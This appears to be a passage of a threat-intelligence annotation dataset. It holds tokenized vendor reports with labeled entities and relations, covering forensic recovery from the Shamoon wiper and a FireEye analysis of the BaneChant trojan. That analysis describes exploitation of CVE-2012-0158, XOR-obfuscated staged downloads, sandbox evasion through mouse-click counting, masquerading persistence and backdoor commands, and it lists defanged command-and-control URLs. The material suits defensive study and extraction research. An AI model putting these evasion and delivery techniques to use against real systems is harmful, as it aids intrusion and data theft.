"files", "that", "weren\u2019t", "wiped", "will", "be", "much", "easier", "and", "faster", "to", "recover", "then"], ["carving", "and", "the", "context", "of", "each", "file", "will", "be", "easy", "to", "interpret", "."], ["To", "recover", "or", "identify", "the", "backup", "VBR", "a", "search", "will", "need", "to", "be", "run", "across", "the", "image", "file", ".", "It", "is"], ["preferable", "if", "the", "image", "file", "is", "a", "raw", "image", "as", "they", "are", "easier", "to", "edit", "then", "other", "image", "file", "formats", "."], ["The", "search", "was", "performed", "for", "the", "hex", "of", "the", "VBR", "file", "header", ",", "EB", "52", "90", "4E", "54", "46", "53", "(\u00ebR", "NTFS)", "."], ["A", "few", "hits", "were", "found", "throughout", "the", "drive", ",", "and", "it", "appeared", "that", "there", "were", "multiple", "empty", "VBR"], ["templates", "throughout", "the", "system", "(Shown", "in", "Figure", "3)", ".", "The", "correct", "VBR", "will", "likely", "be", "the", "one", "with"], ["information", "filled", "in", "from", "offset", "10", "\u2013", "80", "(See", "Figure", "2", "to", "breakdown)", ".", "During", "testing", "it", "was", "found"], ["that", "the", "last", "hit", "was", "normally", "the", "correct", "VBR", ",", "as", "this", "would", "be", "the", "VBR", "found", "at", "the", "end", "of", "the"], ["volume", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "5", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fig", "3", ".", "Example", "of", "a", "blank", "VBR", "."], ["Note:", "On", "2003", "systems", "the", "boot", "backup", "is", "sometimes", "found", "halfway", "through", "the", "partition", ",", "a"], ["manual", "parsing", "of", "the", "file", "will", "need", "to", "be", "performed", "to", "confirm", "the", "VBR", "is", "legitimate", "for", "the"], ["partition", "."], ["Once", "the", "VBR", "was", "found", "we", "noted", "the", "offset", "and", "calculated", "the", "sector", "to", "locate", "the", "backup", "in"], ["our", "desired", "forensic", "program", ".", "For", "the", "purposes", "of", "testing", "we", "used", "EnCase", "(v6", ".", "19.6).", "Once", "the"], ["sector", "of", "the", "backup", "VBR", "is", "known", ",", "EnCase", "was", "started", "and", "the", "image", "of", "the", "infected", "system"], ["was", "loaded", ".", "Within", "disk", "view", "we", "located", "the", "backup", "VBR", "and", "right", "clicked", "to", "add", "a", "manual"], ["partition", "as", "an", "NTFS", "file", "system", ".", "The", "partition", "was", "added", ",", "the", "MFT", "read", ",", "and", "the", "file", "system"], ["appeared:"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "6", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fig", "4", ".", "File", "system", "recovered", "within", "EnCase", "."], ["With", "the", "file", "system", "restored", "some", "relevant", "artifacts", "can", "be", "located", "now", ",", "and", "an", "actual", "computer"], ["forensic", "examination", "can", "take", "place", "."], ["This", "recovery", "can", "be", "successful", "without", "the", "use", "of", "the", "EnCase", "suite", "of", "forensic", "software", "as", "well", "."], ["Using", "a", "hex", "editor", "of", "your", "choice", "to", "repair", "the", "image", ",", "in", "our", "testing", "WinHex", "(16", ".", "6)", "was", "used", ".", "Find"], ["the", "file", "header", "of", "the", "backup", "VBR", "within", "a", "file", "editor", ",", "copy", "from", "the", "header", "to", "footer", "of", "the", "boot"], ["sector;", "the", "footer", "will", "always", "be", "55", "AA", ".", "The", "size", "will", "be", "512", "bytes", "from", "header", "to", "footer", ".", "Then"], ["depending", "on", "what", "operating", "system", "is", "being", "examined", "you", "can", "write", "the", "copied", "boot", "sector", "to"], ["the", "appropriate", "sector", "on", "the", "affected", "image", "."], ["Placing", "the", "boot", "sector", "into", "the", "correct", "location", "will", "be", "the", "trickiest", "part", "as", "incorrect", "placement", "will"], ["result", "in", "the", "file", "system", "not", "being", "recognized", ".", "The", "boot", "sector", "should", "be", "placed", "at", "sector", "63/56"], ["for", "XP/2003", ",", "and", "at", "sector", "2048/206848", "for", "Windows", "7", ".", "After", "this", "is", "complete", "you", "will", "be", "able", "to"], ["add", "the", "image", "into", "the", "forensic", "program", ".", "If", "the", "file", "system", "is", "not", "recognized", "then", "it", "is", "possible", "that"], ["the", "MBR", "will", "need", "to", "be", "reconstructed", ",", "though", "this", "is", "unlikely", ".", "Before", "rebuilding", "the", "MBR", "try"], ["adding", "the", "image", "as", "a", "volume", "and", "not", "as", "a", "disk", "."], ["Note:", "Other", "recovery", "techniques", "are", "certainly", "viable", "as", "well", ".", "There", "are", "automated", "partition"], ["rebuilding", "tools", "available", ",", "though", "some", "of", "these", "rely", "on", "a", "valid", "MBR", "to", "work", "properly", "(In", "this", "case"], ["that", "wouldn\u2019t", "be", "feasible)", ".", "Other", "options", "would", "be", "the", "fixboot", "command", "from", "the", "Windows"], ["Recovery", "Console", "found", "on", "a", "Windows", "OS", "disk", ".", "What", "we", "have", "presented", "here", "are", "forensically"], ["sound", "methods", "that", "are", "easily", "repeatable", "and", "least", "damaging", "to", "the", "evidence/image", "."], ["Multiple", "Partition", "Recovery", "Strategies"], ["For", "testing", "purposes", "the", "system", "with", "Windows", "2003", "was", "set", "up", "with", "three", "different", "partitions", ".", "We"], ["wanted", "to", "emulate", "the", "situation", "in", "which", "one", "would", "have", "multiple", "partitions", "on", "the", "computers", ",", "as"], ["is", "quite", "common", ".", "Conceivably", "the", "malware", "should", "wipe", "all", "of", "these", "partitions", "as", "well", ",", "as", "has"], ["been", "seen", "within", "the", "code", "of", "the", "malware", ".", "What", "we", "wanted", "to", "look", "at", "was", "the", "extent", "of", "the"], ["wiping", "on", "the", "partitions", "and", "whether", "the", "same", "techniques", "that", "were", "applied", "to", "a", "single", "partitioned"], ["drive", "would", "still", "apply", "on", "the", "multiple", "partitioned", "drive", "."], ["In", "theory", "each", "partition", "should", "be", "recoverable", ",", "as", "non-bootable", "partitions", "still", "create", "a", "VBR", "and"], ["place", "the", "backup", "at", "the", "end", "of", "the", "partition", "when", "a", "NTFS", "file", "system", "is", "installed", ".", "After", "searching"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "7", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["through", "the", "drive", "we", "found", "that", "there", "were", "three", "VBRs", "that", "all", "seemed", "to", "have", "corresponding"], ["information", "for", "the", "partitions", "that", "were", "originally", "created", ".", "On", "our", "test", "system", "we", "found", "that"], ["EnCase", "was", "not", "adding", "the", "partitions", "in", "a", "way", "that", "would", "recognize", "the", "file", "system", "as", "it", "did", "for"], ["the", "other", "systems", ".", "This", "could", "be", "because", "our", "boot", "sector", "was", "at", "sector", "56", "and", "not", "63", ",", "or"], ["because", "the", "multiple", "partitions", "clash", "when", "trying", "to", "add", "them", "in", "."], ["We", "ended", "up", "having", "to", "edit", "the", "image", "by", "adding", "the", "backup", "boot", "sectors", "into", "the", "correct", "sector"], ["where", "the", "originals", "were", "found", "."], ["Partition"], ["Boot", "Sector", "Placed", "At"], ["Backup", "Boot", "Sector"], ["1", "(Primary)"], ["56"], ["41926079"], ["2"], ["41926080"], ["62417879"], ["3"], ["62417880"], ["82909679"], ["Fig", "5", ".", "VBR", "Placement", "in", "Windows", "2003"], ["Note:", "The", "VBR", "placement", "for", "the", "next", "partition", "starts", "after", "the", "backup", "VBR", "of", "the", "preceding"], ["partition", "."], ["Once", "the", "VBRs", "were", "added", "correctly", "we", "proceeded", "to", "add", "the", "partitions", "into", "EnCase", "."], ["Fig", "6", ".", "Reconstructed", "file", "system", "of", "a", "Windows", "2003", "operating", "system", "wiped", "by", "Shamoon", "."], ["Note:", "EnCase", "gives", "default", "volume", "labels", "when", "added", ",", "so", "C", ",", "D", ",", "and", "E", "are", "respectively", "1", ",", "2", ",", "and"], ["3", "."], ["The", "extent", "of", "the", "wiping", "appeared", "to", "be", "on", "the", "same", "level", "to", "what", "was", "found", "on", "single"], ["partitioned", "drives", ".", "As", "mentioned", "before", "this", "was", "to", "be", "expected", "as", "the", "malware", "tries", "to", "wipe"], ["mounted", "and", "other", "volumes", "first", "and", "will", "then", "move", "to", "the", "primary", "volume", "(1/C)", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "8", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["The", "Fidelis", "Take"], ["Fidelis", "researchers", "have", "developed", "a", "set", "of", "rules", "for", "detecting", "the", "Shamoon", "malware", "along", "the"], ["entire", "threat", "life", "cycle:", "initial", "infection", ",", "lateral", "propagation", ",", "and", "command", "and", "control"], ["communication", ".", "The", "embedded", "malware", "detection", "engine", "also", "recognizes", "the", "variant", "of"], ["Shamoon", "malware", "analyzed", ".", "All", "sensor", "configurations", "are", "capable", "of", "detecting", "the", "initial", "infection"], ["and", "the", "command", "and", "control", "communication", ",", "and", "the", "Fidelis", "XPS", "Internal", "Sensor", "is", "required", "for"], ["detecting", "the", "lateral", "movement", "of", "the", "malicious", "program", "."], ["Further", "Reading"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["Shamoon", "the", "Wiper", "Copycats", "at", "Work", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193786/Shamoon_the_Wiper_Copycats_at_Work"], ["Shamoon", "the", "Wiper", "in", "details", ",", "Tarakanov", "", ",", "Dmitry", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193795/Shamoon_the_Wiper_in_details"], ["Shamoon", "the", "Wiper", "in", "details", "II", ",", "Tarakanov", "", ",", "Dmitry", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://www", ".", "securelist.com/en/blog/208193834/Shamoon_The_Wiper_further_details_Part_II"], ["Shamoon", ",", "a", "two-staged", "targeted", "attack", "(2012)", ",", "retrieved", "26", "Oct", "2012", "from"], ["http://blog", ".", "seculert.com/2012/08/shamoon-two-stage-targeted-attack.html"], ["\u2018Shamoon\u2019", "Virus", "Most", "Destructive", "Ever", "To", "Hit", "A", "Business", ",", "Leon", "Panetta", "Warns", "(2012)", ","], ["retrieved", "from", "http://www", ".", "huffingtonpost.com/2012/10/11/shamoon-virus-leonpanetta_n_1960113.html"], ["Carrier", ",", "Brian", "(2005)", ".", "File", "System", "Forensic", "Analysis", ".", "Upper", "Saddle", "River", ",", "NJ:", "Pearson"], ["Education", "Inc", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "9", "of", "9"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Country", "name": "India", "sent_id": null, "pos": []}, {"old_id": "T2", "type": "ExploitTargetObject", "name": "Offices of the Dalai Lama", "sent_id": null, "pos": []}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "United Nations", "sent_id": null, "pos": []}, {"old_id": "T4", "type": "Location", "name": "Chengdu", "sent_id": null, "pos": []}], "labels": [], "title": ["inputs/shadows-in-the-cloud"], "sents": [["T1", "Country", "8024", "8029", "India"], ["T2", "ExploitTargetObject", "8035", "8060", "Offices", "of", "the", "Dalai", "Lama"], ["T3", "ExploitTargetObject", "8066", "8080", "United", "Nations"], ["T4", "Location", "9032", "9039", "Chengdu"]]}], [{"vertexSet": [{"old_id": "T1", "type": "TrojanHorse", "name": "TrojanAPTBaneChant", "sent_id": 0, "pos": []}, {"old_id": "T2", "type": "Dropper", "name": "Islamic Jihaddoc", "sent_id": 6, "pos": []}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "governments of Middle East and Central Asia", "sent_id": 7, "pos": []}, {"old_id": "T4", "type": "Payload", "name": "MSCOMCTLocx", "sent_id": 40, "pos": []}, {"old_id": "T5", "type": "Vulnerability", "name": "CVE 2012-0158", "sent_id": 41, "pos": [0, 1]}, {"old_id": "T6", "type": "Indicator", "name": "moo", "sent_id": 46, "pos": []}, {"old_id": "T7", "type": "Indicator", "name": "hxxp://symbisecurecom/update/winwordpkg", "sent_id": 54, "pos": []}, {"old_id": "T8", "type": "Dropper", "name": "winwordpkg", "sent_id": 67, "pos": []}, {"old_id": "T9", "type": "Payload", "name": "hxxp://kibberno-iporg/adserv/logojpg", "sent_id": 80, "pos": []}, {"old_id": "T10", "type": "Software", "name": "Mozilla/40", "sent_id": 81, "pos": []}, {"old_id": "T11", "type": "Software", "name": "MSIE 60", "sent_id": 81, "pos": []}, {"old_id": "T12", "type": "Software", "name": "Windows NT 51", "sent_id": 81, "pos": []}, {"old_id": "T13", "type": "File", "name": "C:\\ProgramData\\Google2\\GoogleUpdateexe", "sent_id": 86, "pos": []}, {"old_id": "T14", "type": "File", "name": "GoogleUpdateexe", "sent_id": 88, "pos": []}, {"old_id": "T15", "type": "Indicator", "name": "hxxp://symbisecurecom/adserv/getphp", "sent_id": 94, "pos": []}, {"old_id": "T16", "type": "Obfuscation", "name": "Base-64", "sent_id": 94, "pos": [8]}, {"old_id": "T17", "type": "Indicator", "name": "BaneChant", "sent_id": 95, "pos": []}, {"old_id": "T18", "type": "TrojanHorse", "name": "TrojanAPTBaneChant", "sent_id": 97, "pos": []}, {"old_id": "T19", "type": "Payload", "name": "GoogleUpdateexe", "sent_id": 105, "pos": []}, {"old_id": "T20", "type": "Payload", "name": "GoogleUpdateexe", "sent_id": 107, "pos": []}], "labels": [{"old_id": "R1", "r": "P13", "h": 17, "t": 19, "evidence": [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107]}, {"old_id": "R2", "r": "P13", "h": 17, "t": 18, "evidence": [97, 98, 99, 100, 101, 102, 103, 104, 105]}, {"old_id": "R3", "r": "P21", "h": 16, "t": 17, "evidence": [95, 96, 97]}, {"old_id": "R4", "r": "P21", "h": 14, "t": 17, "evidence": [94, 95, 96, 97]}, {"old_id": "R5", "r": "P13", "h": 17, "t": 15, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 13, "t": 17, "evidence": [88, 89, 90, 91, 92, 93, 94, 95, 96, 97]}, {"old_id": "R7", "r": "P21", "h": 12, "t": 17, "evidence": [86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97]}, {"old_id": "R8", "r": "P13", "h": 17, "t": 8, "evidence": []}, {"old_id": "R9", "r": "P13", "h": 7, "t": 8, "evidence": [67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]}, {"old_id": "R10", "r": "P13", "h": 1, "t": 3, "evidence": [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40]}, {"old_id": "R11", "r": "P21", "h": 5, "t": 0, "evidence": []}, {"old_id": "R12", "r": "P21", "h": 6, "t": 0, "evidence": []}], "title": ["inputs/txt/201304FireEyeTrojanAPTBaneChant"], "sents": [["Trojan", ".", "APT.BaneChant:", "In-Memory", "Trojan", "That", "Observes", "for"], ["Multiple", "Mouse", "Clicks"], ["Summary"], ["Last", "December", ",", "our", "senior", "malware", "researcher", "(Mr", ".", "Abhishek", "Singh)", "posted", "an", "article", "about", "a", "Trojan"], ["which", "could", "detect", "mouse", "clicks", "to", "evade", "sandbox", "analysis", ".", "Interestingly", ",", "we", "have", "found", "another", "spear"], ["phishing", "document", "that", "downloads", "malware", "which", "incorporates", "improved", "mouse", "click", "detection", "antisandboxing", "capability", ".", "It", "also", "leverages", "multiple", "advanced", "evasion", "techniques", "to", "achieve", "stealth", "and"], ["persistent", "infection", ".", "The", "name", "of", "malicious", "document", "is", "translated", "to", "be", "\u201cIslamic", "Jihad", ".", "doc\u201d.", "Hence", ",", "we"], ["suspect", "that", "this", "weaponized", "document", "was", "used", "to", "target", "the", "governments", "of", "Middle", "East", "and", "Central"], ["Asia", "."], ["This", "new", "malware", "is", "significant", "for", "several", "reasons:"], ["It", "detects", "multiple", "mouse", "clicks:", "In", "the", "past", ",", "evasion", "methods", "using", "mouse", "clicks", "only", "detected"], ["a", "single", "click", ",", "making", "the", "malware", "fairly", "easy", "to", "overcome", "."], ["The", "callback", "goes", "to", "a", "legitimate", "URL:", "Often", "when", "malware", "performs", "its", "callback", ",", "the"], ["communication", "goes", "directly", "to", "the", "CnC", "server", ".", "In", "this", "case", ",", "the", "callback", "goes", "to", "a", "legitimate", "URL"], ["shortening", "service", ",", "which", "would", "then", "redirect", "the", "communication", "to", "the", "CnC", "server", ".", "Automated"], ["blocking", "technologies", "are", "likely", "to", "block", "only", "the", "URL", "shortening", "service", "and", "not", "the", "CnC", "server", "."], ["It", "has", "anti-forensic", "capability:", "This", "malware", "doesn\u2019t", "kick", "into", "high", "gear", "immediately", ".", "Instead", "it"], ["requires", "an", "Internet", "connection", "for", "malicious", "code", "to", "be", "downloaded", "to", "the", "memory", "and"], ["executed", ".", "Unlike", "predecessors", "that", "are", "very", "obvious", "and", "immediately", "get", "to", "work", ",", "this", "malware", "is"], ["merely", "a", "husk", "and", "its", "true", "malicious", "intent", "could", "only", "be", "found", "in", "the", "downloaded", "code", ".", "This"], ["prevents", "forensic", "investigators", "from", "extracting", "the", "\u201ctrue\u201d", "malicious", "code", "from", "the", "disk", "."], ["Overall", ",", "this", "malware", "was", "observed", "to", "send", "information", "about", "the", "computer", "and", "set", "up", "a", "backdoor", "for"], ["remote", "access", ".", "This", "backdoor", "provides", "the", "attacker", "the", "flexibility", "on", "how", "malicious", "activities", "could", "be"], ["executed", "."], ["Technical", "Analysis:", "How", "Does", "it", "Work", "?"], ["After", "opening", "this", "malicious", "document", ",", "it", "attempts", "to", "download", "an", "XOR", "encoded", "binary", "(using", "a", "two", "byte"], ["XOR", "key)", "for", "the", "stage", "one", "payload", ".", "It", "was", "also", "observed", "that", "the", "attacker", "leveraged", "a", "shortened", "URL", "to"], ["\u201chide\u201d", "malicious", "domains", "from", "automated", "analysis", "technologies", ".", "After", "investigation", ",", "the", "malicious"], ["domain", "was", "analyzed", "to", "be", "recently", "registered", ".", "See", "Figure", "1", "for", "the", "first", "stage", "download", "scenario", "."], ["Figure", "1", "Stage", "One", "Download"], ["The", "attacker", "has", "designed", "the", "stage", "one", "malware", "to", "be", "merely", "a", "husk", ".", "Having", "the", "decrypted", "executable", "file"], ["alone", "would", "not", "be", "useful", "in", "understanding", "its", "intent", ".", "It", "is", "because", "a", "majority", "of", "the", "malicious", "code", "is", "only"], ["available", "after", "downloading", "the", "second", "stage", "payload", ".", "The", "second", "stage", "payload", "was", "available", "as", "a", "fake"], ["\u201cJPEG\u201d", "file", "from", "the", "malicious", "server", ".", "By", "designing", "the", "malware", "this", "way", ",", "it", "makes", "it", "harder", "to", "perform"], ["incidence", "response", "and", "facilitates", "ease", "of", "update", "of", "malicious", "code", ".", "Again", ",", "in", "this", "second", "stage", "download", ","], ["the", "malicious", "domain", "was", "not", "found", "in", "the", "malware", ".", "It", "made", "use", "of", "the", "dynamic", "DNS", "service", "provided", "by"], ["\u201cNO-IP\u201d", "to", "indirectly", "access", "the", "malicious", "domain", ".", "See", "Figure", "2", "for", "the", "second", "stage", "download", "scenario", "."], ["The", "technical", "details", "of", "each", "component", "(shellcode", "and", "payload)", "will", "be", "further", "elaborated", "."], ["Figure", "2", "Stage", "Two", "Download"], ["Shellcode", "Analysis"], ["The", "spear", "phishing", "document", "was", "in", "RTF", "format", "which", "as", "designed", "loads", "MSCOMCTL", ".", "ocx", "and", "exploits"], ["CVE", "2012-0158", ".", "By", "executing", "return", "at", "0x27606EFF", ",", "it", "will", "load", "EIP", "with", "address", "0x27583C30", "which", "is"], ["translated", "to", "be", "JMP", "ESP", "to", "execute", "shellcode", "in", "the", "stack", ".", "See", "the", "figure", "below", "."], ["Figure", "3", "Stack", "Corruption", "To", "\u201cJMP", "ESP\u201d"], ["Like", "most", "modern", "shellcode", ",", "its", "stub", "decrypts", "its", "body", "using", "a", "simple", "XOR", "key", "(see", "Figure", "4)", ".", "By", "stepping"], ["through", "the", "shellcode", ",", "it", "attempts", "to", "download", "hxxp://ow", ".", "ly/iGKKT", "and", "saves", "it", "to", "the", "temp", "directory"], ["with", "a", "file", "name", "prefixed", "with", "\u201cmoo\u201d", ",", "e", ".", "g.,", "\u201cmoo1", ".", "tmp\u201d", "(see", "Figure", "5)", ".", "It", "is", "important", "to", "note", "that", "\u201cow", ".", "ly\u201d", "is"], ["not", "a", "malicious", "domain", ".", "Instead", ",", "it", "is", "a", "URL", "shortening", "server", ".", "It", "is", "believed", "that", "the", "rational", "for", "such"], ["indirect", "access", "is", "to", "defeat", "automated", "URL", "blacklisting", ".", "Figure", "6", "depicts", "how", "a", "malicious", "URL", "could", "be"], ["shortened", "using", "this", "service", "."], ["Figure", "4", "Single", "Byte", "XOR", "Key", "0xF1"], ["Figure", "5", "URLDownloadToFileA"], ["Figure", "6", "URL", "Shortening", "Service"], ["From", "the", "network", "traffic", ",", "it", "is", "obvious", "that", "the", "real", "malicious", "content", "is", "located", "at"], ["hxxp://symbisecure", ".", "com/update/winword.pkg", "(see", "Figure", "7)", ".", "As", "an", "excecutable", "file", "usually", "contains"], ["many", "zeros", "in", "series", ",", "the", "zeros", "would", "become", "the", "XOR", "key", "when", "XOR", "encoded", ".", "For", "example", ",", "0xAA", "xor"], ["0\u00d700", "equals", "to", "0xAA", ".", "By", "examining", "the", "content", "using", "a", "hex", "editor", ",", "it", "is", "obvious", "that", "there", "are", "many", "\u201c9E"], ["44\u201d", "repeated", ".", "Hence", ",", "by", "trying", "0x449E", "(little", "endian)", "as", "an", "XOR", "key", ",", "it", "would", "reveal", "that", "it", "is", "a", "PE", "file", ".", "At"], ["offset", "zero", ",", "it", "is", "decrypted", "to", "be", "\u201cMZ\u201d;", "at", "offset", "0x3C", ",", "it", "is", "decrypted", "to", "be", "0x00000E0;", "and", "at"], ["0x000000E0", ",", "it", "is", "decrypted", "to", "be", "PE", "(see", "Figure", "8)", "."], ["By", "generalizing", "this", "idea", ",", "the", "single", "or", "double", "byte", "XOR", "key", "can", "be", "seen", "as", "a", "dword", "XOR", "key", "as", "it", "repeats"], ["over", "itself", ".", "For", "example", ",", "0x449E", "XOR", "key", "could", "be", "seen", "as", "0x449E449E", ".", "By", "counting", "the", "DWORD", "with"], ["the", "highest", "occurance", ",", "it", "could", "be", "a", "probable", "XOR", "key", "if", "the", "file", "is", "XOR", "encrypted", ".", "This", "should", "work", "for"], ["samples", "that", "are", "(1", ",", "2", "or", "4", ",", "but", "not", "3", "bytes)", "XOR", "encrypted", "."], ["Figure", "7", "Stage", "1", "Download", "Content"], ["Figure", "8", "Double", "Byte", "XOR", "Encrypted", "Payload"], ["Payload", "Analysis"], ["Even", "though", "\u201cwinword", ".", "pkg\u201d", "is", "an", "executable", "husk", "to", "host", "malicious", "code", "downloaded", "at", "the", "second", "stage", ","], ["it", "contains", "a", "mouse-click", "check", "to", "detect", "human", "behaviors", ".", "Only", "if", "the", "number", "of", "left", "clicks", "is", "three", "or"], ["more", ",", "will", "the", "malware", "proceed", "further", "to", "download", "the", "second", "stage", "payload", "\u2013", "the", "true", "malicious", "code"], ["(see", "Figure", "9", "and", "Figure", "10)", "."], ["Figure", "9", "Track", "Number", "of", "Left", "Clicks"], ["Figure", "10", "Proceed", "If", "Left", "Click", "Count", "Is", "Three", "Or", "More"], ["After", "the", "malware", "detects", "sufficient", "mouse", "clicks", ",", "it", "proceeds", "to", "decrypt", "its", "malicious", "URL", "to", "download"], ["the", "second", "stage", "payload", "(see", "Figure", "11)", ".", "By", "following", "the", "TCP", "stream", "(see", "Figure", "12)", "and", "examining", "the"], ["header", "of", "the", "downloaded", "JPG", "file", ",", "it", "is", "obvious", "that", "downloaded", "content", "is", "not", "a", "JPEG", "file", ".", "By", "doing", "so", ",", "it"], ["effectively", "downloaded", "an", "executable", "content", "that", "is", "not", "conformed", "to", "PE", "format", "to", "defeat", "network", "binary"], ["extraction", ".", "A", "legitimate", "JPG", "file", "should", "contain", "the", "byte", "sequence", "\u201cFFD8FFE0xxxx4A46494600\u201d", "at"], ["offset", "zero", ",", "where", "\u201c4A464946\u201d", "corresponds", "to", "\u201cJFIF\u201d", ".", "Below", "is", "the", "hardcoded", "URL", "and", "user-agent", "that"], ["is", "used", "by", "this", "malware", "sample", "."], ["URL:", "hxxp://kibber", ".", "no-ip.org/adserv/logo.jpg"], ["User-Agent:", "Mozilla/4", ".", "0", "(compatible;", "MSIE", "6", ".", "0;", "Windows", "NT", "5", ".", "1;", "SV2)"], ["Figure", "11", "Malicious", "Domain", "Decryption"], ["Figure", "12", "Fake", "JPG"], ["After", "the", "JPG", "file", "is", "downloaded", "and", "executed", "directly", "in", "the", "memory", ",", "it", "achieves", "persistency", "by", "creating", "a"], ["shortcut", "link", "file", "at", "the", "start", "up", "folder", ".", "This", "link", "file", "will", "execute", "a", "copy", "of", "itself", "located", "at"], ["\u201cC:\\ProgramData\\Google2\\GoogleUpdate", ".", "exe\u201d", "(see", "Figure", "13)", ".", "It", "would", "look", "legitimate", "to", "users", "as", "it"], ["masquerades", "as", "a", "legitimate", "Google", "Updater", ".", "It", "\u201cwould\u201d", "appear", "normal", "if", "it", "attempts", "to", "access", "the"], ["Internet", ".", "In", "comparison", ",", "the", "real", "\u201cGoogleUpdate", ".", "exe\u201d", "resides", "in", "\u201cprogram", "files\u201d", "instead", "\u201cprogram", "data\u201d"], ["directory", "(see", "Figure", "14)", "."], ["Figure", "13", "Persistency", "Mechanism"], ["Figure", "14", "Genuine", "GoogleUpdate", ".", "exe"], ["The", "downloaded", "\u201cJPG\u201d", "file", "was", "analyzed", "to", "be", "a", "backdoor", "in", "the", "victim\u2019s", "machine", ".", "It", "lists", "the", "running"], ["processes", ",", "IP", "configuration", ",", "and", "directories", "of", "root", "drives", "(C", "to", "H)", "as", "depicted", "in", "Figure", "15", ".", "This"], ["information", "is", "posted", "to", "hxxp://symbisecure", ".", "com/adserv/get.php", "in", "Base-64", "format", ".", "After", "decoding", ",", "it", "is"], ["interesting", "that", "it", "begins", "with", "a", "Tag", "named", "\u201cBaneChant\u201d", ".", "After", "doing", "a", "quick", "search", ",", "it", "seems", "to", "be", "a"], ["sound", "track", "composed", "by", "Hans", "Zimmer", "for", "the", "movie", "\u201cThe", "Dark", "Knight", "Rises\u201d", "(see", "Figure", "16)", ".", "This", "is", "the"], ["reason", "we", "name", "this", "malware", "Trojan", ".", "APT.BaneChant."], ["Figure", "15", "Commands", "Executed"], ["Figure", "16", "Exfiltrated", "Computer", "Information"], ["As", "depicted", "in", "Figure", "17", ",", "the", "malware", "could", "perform", "other", "tasks", "as", "listed", "below", "."], ["1", ".", "Command", "\u2018g\u2019:", "Download", "and", "execute", "a", "file", ".", "The", "downloaded", "file", "has", "a", "temporarily", "file", "name"], ["prefixed", "with", "\u201cjava\u201d", "."], ["2", ".", "Command", "\u2018i\u2019:", "Run", "downloaded", "code", "(fileless)", "as", "a", "separate", "thread", ".", "The", "user-agent", "used", "is"], ["\u201cMozilla/5", ".", "0", "(Windows", "NT", "5", ".", "1)", "AppleWebKit/535", ".", "1", "(KHTML", ",", "like", "Gecko)\u201d", "."], ["3", ".", "Command", "\u2018x\u2019:", "Download", "and", "execute", ",", "follow", "by", "an", "uninstallation", "of", "\u201cGoogleUpdate", ".", "exe\u201d.", "The"], ["downloaded", "file", "has", "same", "prefix", "\u201cjava\u201d", "."], ["4", ".", "Command", "\u2018u\u2019:", "Uninstall", "\u201cGoogleUpdate", ".", "exe\u201d"], ["Figure", "17", "Backdoor", "Access"], ["Conclusion"], ["As", "defense", "technologies", "advance", ",", "malware", "also", "evolves", ".", "In", "this", "instance", ",", "we", "could", "see", "that", "the", "malware"], ["has", "performed", "a", "number", "of", "tricks", "to", "defeat", "detection", "."], ["It", "attempts", "to:"], ["1", ".", "Evade", "sandbox", "by", "detecting", "human", "behaviors", "(multiple", "mouse", "clicks);"], ["2", ".", "Evade", "network", "binary", "extraction", "technology", "by", "performing", "multi-byte", "XOR", "encryption", "on"], ["executable", "file;"], ["3", ".", "Social", "engineer", "user", "into", "thinking", "that", "the", "malware", "is", "legitimate;"], ["4", ".", "Avoid", "forensic", "and", "incidence", "response", "by", "using", "fileless", "malicious", "codes;", "and"], ["5", ".", "Prevent", "automated", "domain", "blacklisting", "by", "using", "redirection", "via", "URL", "shortening", "and", "Dynamic", "DNS"], ["services", "."], ["This", "entry", "was", "posted", "in", "Advanced", "Malware", ",", "Targeted", "Attack", "by", "Chong", "Rong", "Hwa", ".", "Bookmark", "the"], ["permalink", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "GreedyWonk", "sent_id": 0, "pos": [4]}, {"old_id": "T2", "type": "Campaign", "name": "SnowMan", "sent_id": 4, "pos": []}, {"old_id": "T3", "type": "Vulnerability", "name": "CVE-20140502", "sent_id": null, "pos": []}, {"old_id": "T4", "type": "Campaign", "name": "Operation GreedyWonk", "sent_id": null, "pos": []}, 